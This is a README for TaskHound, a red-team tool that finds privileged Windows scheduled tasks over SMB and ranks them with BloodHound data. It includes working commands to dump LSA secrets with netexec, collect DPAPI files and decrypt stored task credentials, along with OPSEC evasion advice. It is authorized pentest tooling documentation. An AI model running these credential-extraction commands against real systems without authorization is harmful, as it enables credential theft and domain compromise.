# TaskHound

**Windows Privileged Scheduled Task Discovery Tool** for fun and profit.

TaskHound hunts for Windows scheduled tasks that run with privileged accounts and stored credentials. It enumerates tasks over SMB, parses XMLs, and identifies high-value attack opportunities through BloodHound export support.

## Key Features

- **Tier 0 Detection**: Automatically identifies tasks running as classic Tier 0 users
- **DPAPI Support**: Collect and decrypt DPAPI blobs from scheduled tasks
- **BloodHound Export Integration**: Supports both Legacy BloodHound and BloodHound Community Edition (BHCE) formats
- **Password Analysis**: Analyzes password age relative to task creation date for DPAPI dump viability
- **Offline Analysis**: Process previously collected XML files
- **BOF**: BOF implementation for AdaptixC2 (see [BOF/README.md](BOF/README.md))

## Quick Start

```bash
# Install
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install .

# Basic usage
taskhound -u 'homer.simpson' -p 'P@ssw0rd' -d 'thesimpsons.local' -t 'TARGET_HOST'

# With BloodHound data support
taskhound -u 'homer.simpson' -p 'P@ssw0rd' -d 'thesimpsons.local' -t 'TARGET_HOST' --bh-data bloodhound_export.json
```

## Demo Output

```
TTTTT  AAA   SSS  K   K H   H  OOO  U   U N   N DDDD
  T   A   A S     K  K  H   H O   O U   U NN  N D   D
  T   AAAAA  SSS  KKK   HHHHH O   O U   U N N N D   D
  T   A   A     S K  K  H   H O   O U   U N  NN D   D
  T   A   A SSSS  K   K H   H  OOO   UUU  N   N DDDD

                     by 0xr0BIT

[+] Legacy BloodHound export detected
[+] High Value target data loaded
[+] moe.thesimpsons.local: Connected via SMB
[+] moe.thesimpsons.local: Local Admin Access confirmed
[*] moe.thesimpsons.local: Crawling Scheduled Tasks (skipping \Microsoft for speed)
[+] moe.thesimpsons.local: Found 7 tasks, privileged 2

[TIER-0] Windows\System32\Tasks\BackupTask
        Enabled : True
        RunAs   : THESIMPSONS\Administrator
        What    : C:\Scripts\backup.exe --daily
        Author  : THESIMPSONS\Administrator  
        Date    : 2025-09-18T23:04:37.3089851
        Reason  : AdminSDHolder; TIER0 Group Membership
        Password Analysis : Password changed BEFORE task creation, password is valid!
        Next Step: Try DPAPI Dump / Task Manipulation

[PRIV] Windows\System32\Tasks\MaintenanceTask
        Enabled : True
        RunAs   : THESIMPSONS\marge.simpson
        What    : C:\Tools\cleanup.exe
        Author  : THESIMPSONS\Administrator
        Date    : 2025-09-18T23:05:43.0854575
        Reason  : High Value match found
        Password Analysis : Password changed AFTER task creation, Password could be stale
        Next Step: Try DPAPI Dump / Task Manipulation

[TASK] Windows\System32\Tasks\SIDTask  
        Enabled : True
        RunAs   : Administrator (S-1-5-21-3211413907-14631080-1147255650-500)
        What    : C:\Windows\System32\cmd.exe /c backup
        Author  : SYSTEM
        Date    : 2025-09-15T08:15:22.1234567

[TASK] Windows\System32\Tasks\UserTask
        Enabled : False
        RunAs   : THESIMPSONS\bart.simpson
        What    : C:\Windows\System32\notepad.exe
        Author  : THESIMPSONS\bart.simpson
        Date    : 2025-09-18T12:30:15.1234567

================================================================================
SUMMARY
================================================================================
HOSTNAME                | TIER-0_TASKS | PRIVILEGED_TASKS | NORMAL_TASKS
------------------------------------------------------------------------
moe.thesimpsons.local   | 1            | 1                | 6           
================================================================================
[+] Check the output above or your saved files for detailed task information
```

## BloodHound Integration

TaskHound supports both **Legacy BloodHound** and **BloodHound Community Edition (BHCE)** formats with automatic format detection.

### Tier 0 Detection
TaskHound uses multiple detection methods for Tier 0 identification:

**BHCE Format:**
- `isTierZero` attribute
- System tags (e.g., `admin_tier_0`)
- AdminSDHolder (`admincount=1`)

**Legacy Format:**
- AdminSDHolder (`admincount=1`) 
- SID-based detection

**Supported Tier 0 Groups:**
- Domain Admins, Enterprise Admins, Schema Admins
- Key Admins, Enterprise Key Admins
- Local Administrators, Domain Controllers
- Backup/Server/Account/Print Operators

### Data Ingestion

TaskHound supports the parsing of both BloodHound Community Edition and Legacy BloodHound Exports.
Legacy BloodHound supports both `JSON` and `CSV` while `CSV` is deprecated and will be removed in future releases.

You can generate ingestable data with the following queries:

#### BloodHound Community Edition (BHCE)
```cypher
MATCH (n)
WHERE coalesce(n.system_tags, "") CONTAINS "admin_tier_0"
   OR n.highvalue = true
MATCH p = (n)-[:MemberOf*1..]->(g:Group)
RETURN p;
```

#### Legacy BloodHound 
```cypher
MATCH (u:User {highvalue:true})
OPTIONAL MATCH (u)-[:MemberOf*1..]->(g:Group)
WITH u, properties(u) as all_props, collect(g.name) as groups, collect(g.objectid) as group_sids
RETURN u.samaccountname AS SamAccountName, all_props, groups, group_sids
ORDER BY SamAccountName
```

> **Note**: The above shown legacy query only works with JSON export. The `all_props` field contains all BloodHound user attributes, making it much more maintainable than manually specifying each field.

## SID Resolution

TaskHound tries to automatically resolve SIDs to samaccountnames for improved readability when encountered in a task.
Before using any outbound connection, it will try to resolve them using the supplied BloodHound data.
If there is no data found or wasn't supplied, taskhound will then try to look up the SID via LDAP unless supressed with `--no-ldap`

> **NOTE**: To use this reliably with kerberos auth you need a working krb5.conf.  

## EXPERIMENTAL Features

> **WARNING**  
> Features in this section are **UNSAFE** for production environments. Limited testing has been done in lab environments. Don't blame me if something blows up your op or gets you busted. You have been warned.

### DPAPI Credential Extraction

TaskHound can extract and decrypt Task Scheduler credentials stored by Windows using DPAPI. This feature supports two workflows:

**Online Mode: Live Collection & Decryption**
```bash
# First, obtain DPAPI_SYSTEM userkey via LSA dump:
nxc smb 192.168.1.10 -u admin -p pass --lsa

# Option 1: Collect only (saves to dpapi_loot/192.168.1.10/)
taskhound -t 192.168.1.10 -u admin -p pass -d domain --loot

# Option 2: Collect + decrypt immediately (credentials shown inline with tasks)
taskhound -t 192.168.1.10 -u admin -p pass -d domain --loot --dpapi-key 0x51e43225...

# Option 3: Collect from multiple targets (WITHOUT --dpapi-key)
taskhound --targets-file hosts.txt -u admin -p pass -d domain --loot
# Then decrypt each target offline with its specific key
```

**Offline Mode: Decrypt Previously Collected Files**
```bash
# Decrypt files collected earlier with --loot:
taskhound --offline dpapi_loot/192.168.1.10 --dpapi-key 0x51e43225...
```

> **Important**: Each target has a unique DPAPI key. The `--dpapi-key` flag can only be used with a single target, NOT with `--targets-file`. For multiple targets, use `--loot` (without `--dpapi-key`) to collect files, then decrypt each target offline with its specific key.

### Credential Guard Detection

Checks remote registry for Credential Guard status to determine DPAPI dump feasibility. Results include `"credential_guard": true/false` in output.

### BOF Implementation
See [BOF/README.md](BOF/README.md) for a Beacon Object File implementation of the core collection functionality.

## Full Usage Reference

```
Usage: taskhound [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [--hashes HASHES] 
                 [-k] [-t TARGET] [--targets-file TARGETS_FILE] [--dc-ip DC_IP]
                 [--offline OFFLINE] [--bh-data BH_DATA] [--include-ms] 
                 [--include-local] [--include-all] [--unsaved-creds] [--no-ldap]
                 [--credguard-detect] [--loot] [--dpapi-key DPAPI_KEY]
                 [--plain PLAIN] [--json JSON] [--csv CSV] 
                 [--backup BACKUP] [--no-summary] [--debug]

Authentication:
  -u, --username        Username (required for online mode)
  -p, --password        Password (omit with -k for Kerberos/ccache)  
  -d, --domain          Domain (required for online mode)
  --hashes HASHES       NTLM hashes (LM:NT or NT-only format)
  -k, --kerberos        Use Kerberos authentication (supports ccache)

Targets:
  -t, --target          Single target hostname/IP
  --targets-file        File with targets, one per line
  --dc-ip               Domain controller IP (required for Kerberos without DNS)

Scanning:
  --offline OFFLINE     Parse previously collected XML files from directory
  --bh-data BH_DATA     BloodHound export file (CSV/JSON) for high-value detection
  --include-ms          Include \Microsoft tasks (WARNING: very slow)
  --include-local       Include local system accounts (NT AUTHORITY\SYSTEM, etc.)
  --include-all         Include ALL tasks (combines --include-ms, --include-local, 
                        --unsaved-creds - WARNING: very slow and noisy)
  --unsaved-creds       Show tasks without stored credentials
  --no-ldap             Disable LDAP queries for SID resolution
  --credguard-detect    EXPERIMENTAL: Detect Credential Guard via remote registry

DPAPI Operations:
  --loot                Collect DPAPI files (masterkeys + credentials) for decryption
                        Without --dpapi-key: saves files to dpapi_loot/<target>/
                        With --dpapi-key: decrypts credentials immediately
                        When combined with --backup: nests dpapi_loot/ inside backup directory
  --dpapi-key KEY       DPAPI_SYSTEM userkey (hex format from LSA secrets dump)
                        Use with --loot for live decryption, or with --offline for 
                        offline decryption of previously collected files

Output:
  --plain PLAIN         Save plain text output per target
  --json JSON           Export results to JSON file  
  --csv CSV             Export results to CSV file
  --backup BACKUP       Save raw XML files for offline analysis
                        When combined with --loot: creates consolidated output directory
                        Structure: <backup_dir>/<target>/Tasks/ and dpapi_loot/
  --no-summary          Disable summary table (shown by default)
  --debug               Enable debug output and full stack traces
```

## OPSEC Considerations

TaskHound relies heavily on impacket for SMB/RPC/Kerberos operations. Standard impacket IOCs apply.
**If you really care about OPSEC**: Use the BOF implementation or collect tasks manually, then analyze offline.

## Roadmap

When caffeine intake and free time align:
- BloodHound DB Connector to always query the freshest BloodHound Data without the need for exports/imports
  - (Will be prioritized as it's needed for the NetExec Module)
- Dedicated NetExec module (PR in Review)
- Support custom Tier-0 mappings instead of just the default ones
- OpenGraph integration for attack path mapping  

## Disclaimer

TaskHound is strictly an **audit and educational tool**. Use only in environments you own or where you have explicit authorization to test. Seriously. Don't be a jerk.

## Acknowledgement

[Fortra/Impacket](https://github.com/fortra/impacket) - SMB/RPC/Kerberos operations

[SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound) - Active Directory attack path analysis

[skelsec/dpapick3](https://github.com/skelsec/dpapick3) - DPAPI decryption library and implementation reference

[Pupy Project](https://github.com/n1nj4sec/pupy) - DPAPI SYSTEM masterkey decryption techniques

[gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) - DPAPI operations and LSA secrets extraction research

and every contributor to these projects for the amazing work they did for the community.

## Contributing

PRs welcome. Don't expect wonders though - half of this was caffeine-induced vibe-coding.

## License

Use responsibly. No warranty provided. See `LICENSE` for details.
